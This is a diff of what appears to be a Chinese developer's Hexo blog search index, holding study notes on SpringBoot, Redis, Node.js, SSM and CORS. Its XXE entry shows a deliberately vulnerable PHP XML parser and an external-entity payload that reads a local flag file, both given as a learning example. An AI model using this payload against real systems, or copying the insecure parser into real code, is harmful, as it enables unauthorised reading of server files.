-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--手动指定文件夹为resources--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>第二种</li>
-</ul>
-<p>在resource文件夹中新建mapper文件夹中，放入StudentMapper.xml，在application.properties中写入以下代码</p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#配置内嵌Tomcat端口号</span></span><br><span class="line"><span class="meta">server.port</span>=<span class="string">9090 </span></span><br><span class="line"><span class="comment">#配置项目上下文根</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/</span></span><br><span class="line"><span class="comment">#配置数据库的连接信息</span></span><br><span class="line"><span class="comment"># 注意这里的驱动类有变化</span></span><br><span class="line"><span class="meta">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="meta">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/springboot_student?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=GMT%2B8</span></span><br><span class="line"><span class="meta">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="meta">spring.datasource.password</span>=<span class="string">root</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#指定MyBatis映射文件路径</span></span><br><span class="line"><span class="meta">mybatis.mapper-locations</span>=<span class="string">classpath:mapper/*.xml</span></span><br></pre></td></tr></table></figure>
-<h1 id="6-集成Redis依赖"><a href="#6-集成Redis依赖" class="headerlink" title="6.集成Redis依赖"></a>6.集成Redis依赖</h1><p><strong>1.在pom.xml中添加以下依赖</strong></p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--SpringBoot集成Redis起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>2.配置application.properties</strong></p>
-<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#设置redis配置信息</span></span><br><span class="line"><span class="meta">spring.redis.host</span>=<span class="string">localhost</span></span><br><span class="line"><span class="meta">spring.redis.port</span>=<span class="string">6379</span></span><br><span class="line"><span class="meta">spring.redis.password</span>=<span class="string">root</span></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>SpringBoot学习</category>
-      </categories>
-      <tags>
-        <tag>SpringBoot学习</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SpringBoot注解</title>
     <url>/post/2f294b8e.html</url>
     <content><![CDATA[<p>　　在开发过程中经常用到的注解<span id="more"></span></p>
@@ -2295,6 +2356,27 @@
       </tags>
   </entry>
   <entry>
+    <title>XXE攻击</title>
+    <url>/post/16c3837a.html</url>
+    <content><![CDATA[<p>　　XML语言，还是不能够理解<span id="more"></span></p>
+<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>　　XXE攻击（XML External Entity），也就是<strong>XML外部实体注入漏洞</strong>。这个漏洞显然和XML有关。</p>
+<p>假设有个应用有一个很简单的功能，html有个表单提交，如下：</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">user</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">pass</span>&gt;</span>123<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>服务端接受该xml之后，将其中的用户名和密码解析出来</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Username: &quot;</span>.$creds-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Password: &quot;</span>.$creds-&gt;pass;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZmVuZ3dlbmh1YS9JbWFnZUJlZC9yYXcvbWFzdGVyLzE1ODEwMDI1ODRfMjAyMDAyMDYyMzA0MzcyOTBfMjA2NjQxNzM4Mi5wbmc?x-oss-process=image/format,png" alt=""></p>
+<p>如果给这个xml加上一段dtd，让xml解析我们引入的外部实体，这样，我们想读哪个文件，就读哪个文件。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;e:&#x2F;flag.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;login&gt;</span><br><span class="line">  &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">  &lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;login&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZmVuZ3dlbmh1YS9JbWFnZUJlZC9yYXcvbWFzdGVyLzE1ODEwMDI1ODVfMjAyMDAyMDYyMzE4NTgyNzFfMTE3MTM5OTk5MC5wbmc?x-oss-process=image/format,png" alt=""></p>
+]]></content>
+      <categories>
+        <category>网络安全知识学习</category>
+      </categories>
+      <tags>
+        <tag>XXE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XSS攻击</title>
     <url>/post/4fa736d8.html</url>
     <content><![CDATA[<p>　　通过DVWA学习这个挺好<span id="more"></span></p>
@@ -2341,27 +2423,6 @@
       </categories>
       <tags>
         <tag>XSS</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XXE攻击</title>
-    <url>/post/16c3837a.html</url>
-    <content><![CDATA[<p>　　XML语言，还是不能够理解<span id="more"></span></p>
-<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>　　XXE攻击（XML External Entity），也就是<strong>XML外部实体注入漏洞</strong>。这个漏洞显然和XML有关。</p>
-<p>假设有个应用有一个很简单的功能，html有个表单提交，如下：</p>
-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">user</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">pass</span>&gt;</span>123<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>服务端接受该xml之后，将其中的用户名和密码解析出来</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Username: &quot;</span>.$creds-&gt;user.<span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Password: &quot;</span>.$creds-&gt;pass;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZmVuZ3dlbmh1YS9JbWFnZUJlZC9yYXcvbWFzdGVyLzE1ODEwMDI1ODRfMjAyMDAyMDYyMzA0MzcyOTBfMjA2NjQxNzM4Mi5wbmc?x-oss-process=image/format,png" alt=""></p>
-<p>如果给这个xml加上一段dtd，让xml解析我们引入的外部实体，这样，我们想读哪个文件，就读哪个文件。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;e:&#x2F;flag.txt&quot; &gt;]&gt;</span><br><span class="line">&lt;login&gt;</span><br><span class="line">  &lt;user&gt;&amp;xxe;&lt;&#x2F;user&gt;</span><br><span class="line">  &lt;pass&gt;mypass&lt;&#x2F;pass&gt;</span><br><span class="line">&lt;&#x2F;login&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZmVuZ3dlbmh1YS9JbWFnZUJlZC9yYXcvbWFzdGVyLzE1ODEwMDI1ODVfMjAyMDAyMDYyMzE4NTgyNzFfMTE3MTM5OTk5MC5wbmc?x-oss-process=image/format,png" alt=""></p>
-]]></content>
-      <categories>
-        <category>网络安全知识学习</category>
-      </categories>
-      <tags>
-        <tag>XXE</tag>
       </tags>
   </entry>
   <entry>
@@ -2475,6 +2536,60 @@
       </tags>
   </entry>
   <entry>
+    <title>nodejs安装配置</title>
+    <url>/post/647e4c1a.html</url>
+    <content><![CDATA[<p>　　这个是在搭建博客的时候配置nodejs的过程，记录下来<span id="more"></span></p>
+<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>下载地址：<a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a></p>
+<p><img src="https://s3.ax1x.com/2020/11/20/DMwC1x.jpg" alt="DMwC1x.jpg" style="zoom:50%;" /></p>
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>双击打开安装文件：</p>
+<p><img src="https://upload-images.jianshu.io/upload_images/2267589-f40b21a6ccbebefa.png?imageMogr2/auto-orient/strip%7CimageView2/2" alt=""></p>
+<p>安装完成之后，在dos窗口中输入”node -v“查看版本号，这里我下载的12版本</p>
+<p><img src="https://s3.ax1x.com/2020/11/20/DMwPc6.jpg" alt="DMwPc6.jpg"></p>
+<h1 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h1><p>1.在nodejs文件夹下创建两个文件夹：node_global和node_cache</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>新建文件夹</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>node_global</td>
+<td>放安装过程中的缓存文件</td>
+</tr>
+<tr>
+<td>node_cache</td>
+<td>最终的模块配置位置</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><img src="https://s3.ax1x.com/2020/11/20/DMwijK.jpg" alt="DMwijK.jpg"></p>
+<p>2.创建完两个文件夹之后，打开dos窗口，输入</p>
+<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">npm<span class="built_in"> config </span><span class="builtin-name">set</span><span class="built_in"> prefix </span><span class="string">&quot;D:\Drops\NODEJS\node_global&quot;</span></span><br><span class="line">npm<span class="built_in"> config </span><span class="builtin-name">set</span> cache <span class="string">&quot;D:\Drops\NODEJS\node_cache&quot;</span></span><br></pre></td></tr></table></figure>
+<p><strong>注意引号之间的路径填上自己的目录路径</strong></p>
+<p><img src="https://s3.ax1x.com/2020/11/20/DMwknO.jpg" alt="DMwknO.jpg"></p>
+<p>3.在”系统变量下“新建”NODE_PATH“，填入D:\Drops\NODEJS\node_global\node_modules</p>
+<p><img src="https://s3.ax1x.com/2020/11/20/DMw991.jpg" alt="DMw991.jpg" style="zoom:67%;" /></p>
+<p>4.将用户变量下的“PATH”修改为D:\Drops\NODEJS\node_global</p>
+<p><img src="https://s3.ax1x.com/2020/11/20/DMwShR.jpg" alt="DMwShR.jpg" style="zoom:67%;" /></p>
+<p><img src="https://s3.ax1x.com/2020/11/20/DMdzN9.jpg" alt="DMdzN9.jpg" style="zoom:67%;" /></p>
+<p><img src="https://s3.ax1x.com/2020/11/20/DMdxAJ.jpg" alt="DMdxAJ.jpg"></p>
+<p>5.在dos窗口中输入node回车，再输入require(‘cluster’)出现下图，既安装成功</p>
+<p><img src="https://s3.ax1x.com/2020/11/20/DMdj74.jpg" alt="DMdj74.jpg"></p>
+<p>参考文章：<a href="https://www.jianshu.com/p/13f45e24b1de">https://www.jianshu.com/p/13f45e24b1de</a></p>
+]]></content>
+      <categories>
+        <category>环境配置</category>
+      </categories>
+      <tags>
+        <tag>环境配置</tag>
+        <tag>Nodejs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>nginx+vsftp搭建图片服务器</title>
     <url>/post/dd124e24.html</url>
     <content><![CDATA[<p>　　在写小程序项目的时候需要用到图片服务器，没有云服务器，只能自己搭建，linux最好是静态ip，动态ip的话，如果虚拟机的地址发生变化，访问路径也在改变，影响做项目进展。<span id="more"></span></p>
@@ -2547,60 +2662,6 @@
 ]]></content>
       <tags>
         <tag>nginx</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>nodejs安装配置</title>
-    <url>/post/647e4c1a.html</url>
-    <content><![CDATA[<p>　　这个是在搭建博客的时候配置nodejs的过程，记录下来<span id="more"></span></p>
-<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>下载地址：<a href="https://nodejs.org/zh-cn/download/">https://nodejs.org/zh-cn/download/</a></p>
-<p><img src="https://s3.ax1x.com/2020/11/20/DMwC1x.jpg" alt="DMwC1x.jpg" style="zoom:50%;" /></p>
-<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>双击打开安装文件：</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/2267589-f40b21a6ccbebefa.png?imageMogr2/auto-orient/strip%7CimageView2/2" alt=""></p>
-<p>安装完成之后，在dos窗口中输入”node -v“查看版本号，这里我下载的12版本</p>
-<p><img src="https://s3.ax1x.com/2020/11/20/DMwPc6.jpg" alt="DMwPc6.jpg"></p>
-<h1 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h1><p>1.在nodejs文件夹下创建两个文件夹：node_global和node_cache</p>
-<div class="table-container">
-<table>
-<thead>
-<tr>
-<th>新建文件夹</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>node_global</td>
-<td>放安装过程中的缓存文件</td>
-</tr>
-<tr>
-<td>node_cache</td>
-<td>最终的模块配置位置</td>
-</tr>
-</tbody>
-</table>
-</div>
-<p><img src="https://s3.ax1x.com/2020/11/20/DMwijK.jpg" alt="DMwijK.jpg"></p>
-<p>2.创建完两个文件夹之后，打开dos窗口，输入</p>
-<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">npm<span class="built_in"> config </span><span class="builtin-name">set</span><span class="built_in"> prefix </span><span class="string">&quot;D:\Drops\NODEJS\node_global&quot;</span></span><br><span class="line">npm<span class="built_in"> config </span><span class="builtin-name">set</span> cache <span class="string">&quot;D:\Drops\NODEJS\node_cache&quot;</span></span><br></pre></td></tr></table></figure>
-<p><strong>注意引号之间的路径填上自己的目录路径</strong></p>
-<p><img src="https://s3.ax1x.com/2020/11/20/DMwknO.jpg" alt="DMwknO.jpg"></p>
-<p>3.在”系统变量下“新建”NODE_PATH“，填入D:\Drops\NODEJS\node_global\node_modules</p>
-<p><img src="https://s3.ax1x.com/2020/11/20/DMw991.jpg" alt="DMw991.jpg" style="zoom:67%;" /></p>
-<p>4.将用户变量下的“PATH”修改为D:\Drops\NODEJS\node_global</p>
-<p><img src="https://s3.ax1x.com/2020/11/20/DMwShR.jpg" alt="DMwShR.jpg" style="zoom:67%;" /></p>
-<p><img src="https://s3.ax1x.com/2020/11/20/DMdzN9.jpg" alt="DMdzN9.jpg" style="zoom:67%;" /></p>
-<p><img src="https://s3.ax1x.com/2020/11/20/DMdxAJ.jpg" alt="DMdxAJ.jpg"></p>
-<p>5.在dos窗口中输入node回车，再输入require(‘cluster’)出现下图，既安装成功</p>
-<p><img src="https://s3.ax1x.com/2020/11/20/DMdj74.jpg" alt="DMdj74.jpg"></p>
-<p>参考文章：<a href="https://www.jianshu.com/p/13f45e24b1de">https://www.jianshu.com/p/13f45e24b1de</a></p>
-]]></content>
-      <categories>
-        <category>环境配置</category>
-      </categories>
-      <tags>
-        <tag>环境配置</tag>
-        <tag>Nodejs</tag>
       </tags>
   </entry>
   <entry>
@@ -3024,6 +3085,55 @@
       </tags>
   </entry>
   <entry>
+    <title>使用IDEA搭建SSM框架</title>
+    <url>/post/e2e0c666.html</url>
+    <content><![CDATA[<p>　　刚学习过SSM，记录一下如何创建项目<span id="more"></span></p>
+<h1 id="IDEA新建项目"><a href="#IDEA新建项目" class="headerlink" title="IDEA新建项目"></a>IDEA新建项目</h1><h2 id="1-创建Maven工程"><a href="#1-创建Maven工程" class="headerlink" title="1.创建Maven工程"></a>1.创建Maven工程</h2><p><img src="https://s3.ax1x.com/2020/11/29/DcELCT.md.jpg" alt="DcELCT.md.jpg"></p>
+<h2 id="2-填写GroupID和ArtifactId"><a href="#2-填写GroupID和ArtifactId" class="headerlink" title="2.填写GroupID和ArtifactId"></a>2.填写GroupID和ArtifactId</h2><p><img src="https://s3.ax1x.com/2020/11/29/DcEO8U.jpg" alt="DcEO8U.jpg"></p>
+<h2 id="3-填写项目名称"><a href="#3-填写项目名称" class="headerlink" title="3.填写项目名称"></a>3.填写项目名称</h2><p><img src="https://s3.ax1x.com/2020/11/29/DcEX2F.md.jpg" alt="DcEX2F.md.jpg"></p>
+<h2 id="4-刚建好的只是一个Maven目录"><a href="#4-刚建好的只是一个Maven目录" class="headerlink" title="4.刚建好的只是一个Maven目录"></a>4.刚建好的只是一个Maven目录</h2><p><img src="https://s3.ax1x.com/2020/11/29/DcEjv4.jpg" alt="DcEjv4.jpg"></p>
+<p>最后再完善目录结构，添加webapp、WEB-INF、web.xml文件就可以了</p>
+]]></content>
+      <categories>
+        <category>javaWeb学习</category>
+      </categories>
+      <tags>
+        <tag>SSM</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>乐优商城-day01</title>
+    <url>/post/fb1d2a49.html</url>
+    <content><![CDATA[<h1 id="1-跨域问题"><a href="#1-跨域问题" class="headerlink" title="1.跨域问题"></a>1.跨域问题</h1><h2 id="1-1-什么是跨域问题"><a href="#1-1-什么是跨域问题" class="headerlink" title="1.1 什么是跨域问题"></a>1.1 什么是跨域问题</h2><h2 id="1-2-解决方案"><a href="#1-2-解决方案" class="headerlink" title="1.2 解决方案"></a>1.2 解决方案<span id="more"></span></h2><ul>
+<li><p>jsonp</p>
+<p>最早的解决方案，利用script标签可以跨域的原理实现</p>
+<p>限制：</p>
+<ul>
+<li>需要服务的支持</li>
+<li>只能发起GET请求</li>
+</ul>
+</li>
+<li><p>nginx反向代理</p>
+<p>思路是：利用nginx把跨域反向代理为不跨域，支持各种请求凡是</p>
+<p>缺点：需要在nginx进行额外配置，语义不清晰</p>
+</li>
+<li><p>CORS</p>
+<p>跟计划的跨域请求解决方案，安全可靠</p>
+<p>优势：</p>
+<ul>
+<li>在服务端进行控制是否允许跨域，可自定义规则</li>
+<li>支持各种请求方式</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>会产生额外的请求</li>
+</ul>
+</li>
+</ul>
+<h3 id="1-2-1-CORS解决方案"><a href="#1-2-1-CORS解决方案" class="headerlink" title="1.2.1 CORS解决方案"></a>1.2.1 CORS解决方案</h3><p><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">详情请点击这里</a></p>
+<h3 id="1-2-2-在本项目中的实现"><a href="#1-2-2-在本项目中的实现" class="headerlink" title="1.2.2 在本项目中的实现"></a>1.2.2 在本项目中的实现</h3>]]></content>
+  </entry>
+  <entry>
     <title>upload-labs</title>
     <url>/post/80f02bc5.html</url>
     <content><![CDATA[<p>　　BBUCTF的upload-labs关卡<span id="more"></span></p>
@@ -3133,55 +3243,6 @@
       <tags>
         <tag>upload-labs</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>使用IDEA搭建SSM框架</title>
-    <url>/post/e2e0c666.html</url>
-    <content><![CDATA[<p>　　刚学习过SSM，记录一下如何创建项目<span id="more"></span></p>
-<h1 id="IDEA新建项目"><a href="#IDEA新建项目" class="headerlink" title="IDEA新建项目"></a>IDEA新建项目</h1><h2 id="1-创建Maven工程"><a href="#1-创建Maven工程" class="headerlink" title="1.创建Maven工程"></a>1.创建Maven工程</h2><p><img src="https://s3.ax1x.com/2020/11/29/DcELCT.md.jpg" alt="DcELCT.md.jpg"></p>
-<h2 id="2-填写GroupID和ArtifactId"><a href="#2-填写GroupID和ArtifactId" class="headerlink" title="2.填写GroupID和ArtifactId"></a>2.填写GroupID和ArtifactId</h2><p><img src="https://s3.ax1x.com/2020/11/29/DcEO8U.jpg" alt="DcEO8U.jpg"></p>
-<h2 id="3-填写项目名称"><a href="#3-填写项目名称" class="headerlink" title="3.填写项目名称"></a>3.填写项目名称</h2><p><img src="https://s3.ax1x.com/2020/11/29/DcEX2F.md.jpg" alt="DcEX2F.md.jpg"></p>
-<h2 id="4-刚建好的只是一个Maven目录"><a href="#4-刚建好的只是一个Maven目录" class="headerlink" title="4.刚建好的只是一个Maven目录"></a>4.刚建好的只是一个Maven目录</h2><p><img src="https://s3.ax1x.com/2020/11/29/DcEjv4.jpg" alt="DcEjv4.jpg"></p>
-<p>最后再完善目录结构，添加webapp、WEB-INF、web.xml文件就可以了</p>
-]]></content>
-      <categories>
-        <category>javaWeb学习</category>
-      </categories>
-      <tags>
-        <tag>SSM</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>乐优商城-day01</title>
-    <url>/post/fb1d2a49.html</url>
-    <content><![CDATA[<h1 id="1-跨域问题"><a href="#1-跨域问题" class="headerlink" title="1.跨域问题"></a>1.跨域问题</h1><h2 id="1-1-什么是跨域问题"><a href="#1-1-什么是跨域问题" class="headerlink" title="1.1 什么是跨域问题"></a>1.1 什么是跨域问题</h2><h2 id="1-2-解决方案"><a href="#1-2-解决方案" class="headerlink" title="1.2 解决方案"></a>1.2 解决方案<span id="more"></span></h2><ul>
-<li><p>jsonp</p>
-<p>最早的解决方案，利用script标签可以跨域的原理实现</p>
-<p>限制：</p>
-<ul>
-<li>需要服务的支持</li>
-<li>只能发起GET请求</li>
-</ul>
-</li>
-<li><p>nginx反向代理</p>
-<p>思路是：利用nginx把跨域反向代理为不跨域，支持各种请求凡是</p>
-<p>缺点：需要在nginx进行额外配置，语义不清晰</p>
-</li>
-<li><p>CORS</p>
-<p>跟计划的跨域请求解决方案，安全可靠</p>
-<p>优势：</p>
-<ul>
-<li>在服务端进行控制是否允许跨域，可自定义规则</li>
-<li>支持各种请求方式</li>
-</ul>
-<p>缺点：</p>
-<ul>
-<li>会产生额外的请求</li>
-</ul>
-</li>
-</ul>
-<h3 id="1-2-1-CORS解决方案"><a href="#1-2-1-CORS解决方案" class="headerlink" title="1.2.1 CORS解决方案"></a>1.2.1 CORS解决方案</h3><p><a href="https://www.ruanyifeng.com/blog/2016/04/cors.html">详情请点击这里</a></p>
-<h3 id="1-2-2-在本项目中的实现"><a href="#1-2-2-在本项目中的实现" class="headerlink" title="1.2.2 在本项目中的实现"></a>1.2.2 在本项目中的实现</h3>]]></content>
   </entry>
   <entry>
     <title>十次方项目-day06</title>
@@ -3404,21 +3465,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>小程序开发</title>
-    <url>/post/8d10680e.html</url>
-    <content><![CDATA[<p>　　2020年寒假在培训的时候记录的小程序项目<span id="more"></span></p>
-<h1 id="1-首页"><a href="#1-首页" class="headerlink" title="1.首页"></a>1.首页</h1><h2 id="1-1-搜索框组件"><a href="#1-1-搜索框组件" class="headerlink" title="1.1 搜索框组件"></a>1.1 搜索框组件</h2><h2 id="1-2-轮播图"><a href="#1-2-轮播图" class="headerlink" title="1.2 轮播图"></a>1.2 轮播图</h2><h3 id="1-2-1-index-js"><a href="#1-2-1-index-js" class="headerlink" title="1.2.1 index.js"></a>1.2.1 index.js</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 页面开始加载，就会触发</span></span><br><span class="line">onLoad: <span class="function"><span class="keyword">function</span> (<span class="params">opitons</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 1.发送异步请求获取轮播图数据</span></span><br><span class="line">  <span class="keyword">var</span> reqTask = wx.request(&#123;</span><br><span class="line">    url: <span class="string">&#x27;https://api-hmugo-web.itheima.net/api/public/v1/home/swiperdata&#x27;</span>,</span><br><span class="line">    success: <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(result)</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>
-<h3 id="1-2-2-index-wxml"><a href="#1-2-2-index-wxml" class="headerlink" title="1.2.2 index.wxml"></a>1.2.2 index.wxml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 轮播图开始 --&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">view</span> <span class="attr">class</span>=<span class="string">&quot;index_swiper&quot;</span>&gt;</span></span><br><span class="line">       <span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">       1.swiper标签存在默认的宽度和高度    100% * 150px</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       2.image标签默认的高度和宽度     320px * 240px </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">       3.设计图片和轮播图</span></span><br><span class="line"><span class="comment">           3.1 先看原图宽高    750 * 340</span></span><br><span class="line"><span class="comment">           3.2 让图片高度自适应    宽度等于100%</span></span><br><span class="line"><span class="comment">           3.3 让swiper标签的高度  变成和图片一样高</span></span><br><span class="line"><span class="comment">       4.图片标签</span></span><br><span class="line"><span class="comment">         mode属性 渲染模式</span></span><br><span class="line"><span class="comment">           widthFix 让图片的标签宽高和图片标签的内容的宽高都等比例发生变化</span></span><br><span class="line"><span class="comment">       --&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">swiper</span> <span class="attr">autoplay</span> <span class="attr">indicator-dots</span> <span class="attr">circular</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">swiper-item</span> <span class="attr">wx:for</span>=<span class="string">&quot;&#123;&#123;swiperList&#125;&#125;&quot;</span> <span class="attr">wx:key</span>=<span class="string">&quot;goods_id&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">navigator</span>&gt;</span></span><br><span class="line">                   <span class="tag">&lt;<span class="name">image</span> <span class="attr">mode</span>=<span class="string">&quot;widthFix&quot;</span> <span class="attr">src</span>=<span class="string">&quot;&#123;&#123;item.image_src&#125;&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">image</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;/<span class="name">navigator</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">swiper-item</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">swiper</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- 轮播图结束 --&gt;</span></span><br></pre></td></tr></table></figure>
